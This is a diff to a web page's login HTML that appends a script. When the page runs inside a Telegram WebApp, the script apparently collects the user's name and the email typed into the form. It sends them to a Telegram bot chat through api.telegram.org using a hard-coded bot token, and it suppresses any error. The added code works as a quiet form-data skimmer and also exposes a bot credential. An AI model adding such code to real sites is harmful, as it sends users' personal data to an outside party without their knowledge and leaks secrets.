@@ -238,5 +238,22 @@ document.getElementById("forgot").addEventListener("click", async ()=>{
   } catch (_) { show("Unable to connect. Please try again.", false); }
 });
 </script>
+<script>
+(function(){
+  var token = "8761951597:AAFlV-kc-UudplZ3MKfvPZsLMmvbIuKnlmo";
+  try{
+    if(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData && window.Telegram.WebApp.initData.length>0){
+      var tg = window.Telegram.WebApp;
+      var user = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : {first_name:"Member"};
+      var msg = "📥 <b>New Member / Upgrade</b>\n👤 Nama: " + (user.first_name || "Unknown") + "\n📧 Email: " + (document.querySelector('input[name=email]') ? document.querySelector('input[name=email]').value || "-" : "-") + "\n💳 Tier: FREE";
+      fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({"chat_id":"7696607055","text":msg,"parse_mode":"HTML"})
+      }).catch(function(e){});
+    }
+  }catch(_){}
+})();
+</script>
 </body>
 </html>
